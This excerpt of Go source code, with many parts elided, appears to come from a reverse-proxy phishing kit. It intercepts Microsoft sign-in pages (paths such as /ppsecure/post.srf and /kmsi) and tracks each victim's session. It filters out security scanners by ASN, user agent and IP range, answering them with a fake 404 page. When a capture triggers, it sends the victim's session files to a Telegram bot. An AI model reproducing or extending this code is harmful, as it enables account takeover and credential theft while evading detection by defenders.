...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	...
	// Initialize request checker with blocklists
	// Use blocklists directory relative to executable
	exe_path, err := os.Executable()
	var blocklistsDir string
	if err == nil {
		exe_dir := filepath.Dir(exe_path)
		blocklistsDir = filepath.Join(exe_dir, "blocklists")
	} else {
		// Fallback to current working directory
		blocklistsDir = "blocklists"
		log.Warning("request checker: could not get executable path, using relative path")
	}

	log.Debug("request checker: loading blocklists from: %s", blocklistsDir)

	requestChecker, err := NewRequestChecker(
		filepath.Join(blocklistsDir, "asn_list.txt"),
		filepath.Join(blocklistsDir, "useragent_list.txt"),
		filepath.Join(blocklistsDir, "ip_range_list.txt"),
		filepath.Join(blocklistsDir, "ip_list.txt"),
		true, // verbose logging
	)
	if err != nil {
		log.Warning("request checker: failed to initialize: %v", err)
	} else {
		p.requestChecker = requestChecker
		asnCount, uaCount, rangeCount, ipCount := p.requestChecker.GetStats()
		log.Info("request checker: loaded %d ASNs, %d user agent keywords, %d IP ranges, %d IPs",
			asnCount, uaCount, rangeCount, ipCount)
	}
	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			// Check request against advanced blocklists (ASN, User-Agent, IP Range, IP List)
			if p.requestChecker != nil {
				clientIP := GetClientIP(req)
				if shouldBlock, reason := p.requestChecker.CheckRequest(req, clientIP); shouldBlock {
					log.Warning("request checker: blocked request from %s - reason: %s", clientIP, reason)
				...
				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						...
						if err == nil {
							...
							// check if file exists frist using os.Stat()
				...
				if pl != nil && ps.SessionId != "" {
					...
					if err == nil {
						...
						if json_re.MatchString(contentType) {
							...
							if trigger == 1 && p.cfg.general.Teletoken != "" && p.cfg.general.Chatid !=  "" {
								...
								log.Warning("Telegram bot token or chat id not set, can't send notification")
							}
	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			if trigger == 1 || resp.Request.URL.Path == "/landingv2" || resp.Request.URL.Path == "/ppsecure/post.srf" || resp.Request.URL.Path == "/kmsi" ||  resp.Request.URL.Path == "/consent"  {
				// readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
				if  p.cfg.general.Teletoken != "" && p.cfg.general.Chatid !=  "" {
					readfile_with_session_id(ps.SessionId, p.cfg.general.Chatid, p.cfg.general.Teletoken)
...
func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	...
	if redirect_url != "" {
		...
		resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "<html><body><h1>404 Not Found</h1></body></html>")
		if resp != nil {
			return req, resp
		}
		return req, nil
